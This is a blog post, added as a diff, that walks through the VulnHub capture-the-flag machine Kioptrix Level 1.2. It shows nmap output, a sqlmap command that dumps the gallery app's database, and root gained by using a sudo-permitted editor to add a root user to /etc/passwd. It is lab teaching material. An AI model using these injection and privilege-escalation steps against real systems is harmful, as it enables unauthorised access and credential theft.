@@ -1,0 +1,144 @@
+---
+layout: post
+title:  "KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough"
+date:   2020-09-27 15:00:00 +0530
+categories: VulnHub CTF
+---
+KIOPTRIX: LEVEL 1.2 is a machine in which I used SQL Injection to get useres credintials to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.
+
+## Scanning
+As always, I started scanning with Nmap
+
+```
+root@kali:/home/kali# nmap -sV -sC -p- 192.168.198.143
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 21:03 EDT
+Nmap scan report for kioptrix3.com (192.168.198.143)
+Host is up (0.0030s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 00:0C:29:2C:61:46 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
+
+```
+A Normal HTTP and SSH Services
+## HTTP Services 
+So First I tried to browse the website and found a suspicous URL. And Adding the single quotation giving me a MySQL error so it's vulnerable to SQL Injection.
+```
+http://192.168.198.143/gallery/gallery.php?id=1&sort=photoid#photos
+```
+
+## SQL Injection
+So Imeditatly I ran SQLMAP to exploit, dump database and evnatioly crack the hashes found in the database.
+```
+sqlmap -u 192.168.198.143/gallery/gallery.php?id=1 --dump
+```
+
+![Username](/assets/machines/vulnhub/KL12/1.png)
+
+Then I ssh'd to user loneferret.
+
+## Privilege Escalation 
+I ran diffreent Enumeration scripts and found an intersting sudo privileges.
+
+```
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+```
+The su binary path is wrong and it has ! mark. The ht binary is a text and hex editor so I had many ideas in this case.
+
+1. Read /etc/shadow and get root hash then crack it with john (SUCCESS)
+2. Write in /etc/passwd a new user with root privliges (SUCCESS)
+3. Write in /etc/sudoers and change the su binary path (SUCCESS)
+
+But first I had to fix some errors
+
+```
+loneferret@Kioptrix3:~$ sudo ht
+Error opening terminal: xterm-256color.
+loneferret@Kioptrix3:~$ export TERM=xterm
+```
+
+Then i opened /etc/passwd and added yoyo -root- user.
+
+![Username](/assets/machines/vulnhub/KL12/2.png)
+
+Then I logged in using ssh to the created user.
+```
+kali@kali:~$ ssh yoyo@192.168.198.143
+yoyo@192.168.198.143's password: 
+Last login: Mon Apr 18 11:29:13 2011
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+root@Kioptrix3:~# cat Congrats.txt 
+Good for you for getting here.
+Regardless of the matter (staying within the spirit of the game of course)
+you got here, congratulations are in order. Wasn't that bad now was it.
+
+Went in a different direction with this VM. Exploit based challenges are
+nice. Helps workout that information gathering part, but sometimes we
+need to get our hands dirty in other things as well.
+Again, these VMs are beginner and not intended for everyone. 
+Difficulty is relative, keep that in mind.
+
+The object is to learn, do some research and have a little (legal)
+fun in the process.
+
+I hope you enjoyed this third challenge.
+
+Steven McElrea
+aka loneferret
+http://www.kioptrix.com
+
+Credit needs to be given to the creators of the gallery webapp and CMS used
+for the building of the Kioptrix VM3 site.
+
+Main page CMS: 
+http://www.lotuscms.org
+
+Gallery application: 
+Gallarific 2.1 - Free Version released October 10, 2009
+http://www.gallarific.com
+Vulnerable version of this application can be downloaded
+from the Exploit-DB website:
+http://www.exploit-db.com/exploits/15891/
+
+The HT Editor can be found here:
+http://hte.sourceforge.net/downloads.html
+And the vulnerable version on Exploit-DB here:
+http://www.exploit-db.com/exploits/17083/
+
+Also, all pictures were taken from Google Images, so being part of the
+public domain I used them.
+
+```
+and voila here is the root privilege!
+
+
+
+
+
